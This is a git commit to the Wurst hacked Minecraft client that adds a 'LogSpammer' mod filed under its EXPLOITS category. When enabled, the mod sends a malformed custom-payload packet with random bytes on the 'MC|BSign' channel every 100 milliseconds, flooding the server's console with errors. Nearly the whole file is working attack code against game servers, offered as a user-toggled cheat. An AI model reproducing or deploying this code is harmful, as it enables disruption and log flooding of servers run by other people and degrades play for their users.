91e225e52e485c50151960cb4f37bf7526839ed8
vovanre <vovanre@noname.ru>
2016-05-08 15:28:34 +0400

    LogSpammer Mod

---
+++ Wurst Client for MC 1.9.X/src/tk/wurst_client/mods/LogSpammerMod.java
@@ -0,0 +1,88 @@
+/*
+ * Copyright © 2014 - 2016 | Wurst-Imperium | All rights reserved.
+ * 
+ * This Source Code Form is subject to the terms of the Mozilla Public
+ * License, v. 2.0. If a copy of the MPL was not distributed with this
+ * file, You can obtain one at http://mozilla.org/MPL/2.0/.
+ */
+package tk.wurst_client.mods;
+
+import java.awt.Color;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.nio.ByteBuffer;
+import java.nio.ByteOrder;
+import java.nio.channels.GatheringByteChannel;
+import java.nio.channels.ScatteringByteChannel;
+import java.nio.charset.Charset;
+import java.util.HashSet;
+import java.util.LinkedList;
+import java.util.Random;
+
+import io.netty.buffer.ByteBuf;
+import io.netty.buffer.ByteBufAllocator;
+import io.netty.buffer.ByteBufProcessor;
+import io.netty.buffer.Unpooled;
+import net.minecraft.block.Block;
+import net.minecraft.block.material.Material;
+import net.minecraft.entity.player.EntityPlayer.EnumChatVisibility;
+import net.minecraft.entity.player.PlayerCapabilities;
+import net.minecraft.network.PacketBuffer;
+import net.minecraft.network.play.client.CPacketAnimation;
+import net.minecraft.network.play.client.CPacketClientSettings;
+import net.minecraft.network.play.client.CPacketClientStatus;
+import net.minecraft.network.play.client.CPacketConfirmTeleport;
+import net.minecraft.network.play.client.CPacketConfirmTransaction;
+import net.minecraft.network.play.client.CPacketCustomPayload;
+import net.minecraft.network.play.client.CPacketEnchantItem;
+import net.minecraft.network.play.client.CPacketPlayer;
+import net.minecraft.network.play.client.CPacketPlayerAbilities;
+import net.minecraft.network.play.client.CPacketPlayerDigging;
+import net.minecraft.network.play.client.CPacketPlayerDigging.Action;
+import net.minecraft.network.play.client.CPacketUpdateSign;
+import net.minecraft.network.play.client.CPacketVehicleMove;
+import net.minecraft.util.EnumFacing;
+import net.minecraft.util.EnumHand;
+import net.minecraft.util.EnumHandSide;
+import net.minecraft.util.math.BlockPos;
+import tk.wurst_client.events.listeners.LeftClickListener;
+import tk.wurst_client.events.listeners.RenderListener;
+import tk.wurst_client.events.listeners.UpdateListener;
+import tk.wurst_client.mods.Mod.Category;
+import tk.wurst_client.mods.Mod.Info;
+import tk.wurst_client.navigator.NavigatorItem;
+import tk.wurst_client.utils.BlockUtils;
+import tk.wurst_client.utils.RenderUtils;
+
+@Info(category = Category.EXPLOITS, description = "Scores errors the server console.", name = "LogSpammer", tutorial = "Mods/LogSpammer")
+public class LogSpammerMod extends Mod implements UpdateListener {
+	private PacketBuffer payload;
+	private Random random;
+
+	@Override
+	public void onEnable() {
+		random = new Random();
+		payload = new PacketBuffer(Unpooled.buffer());
+		
+		byte[] rawPayload = new byte[random.nextInt(128)];
+		random.nextBytes(rawPayload);
+		payload.writeBytes(rawPayload);
+		
+		updateMS();
+		wurst.events.add(UpdateListener.class, this);
+	}
+
+	@Override
+	public void onUpdate() {
+		if (hasTimePassedM(100)) {
+			mc.thePlayer.sendQueue.addToSendQueue(new CPacketCustomPayload("MC|BSign", payload));
+			updateMS();
+		}
+	}
+
+	@Override
+	public void onDisable() {
+		wurst.events.remove(UpdateListener.class, this);
+	}
+}
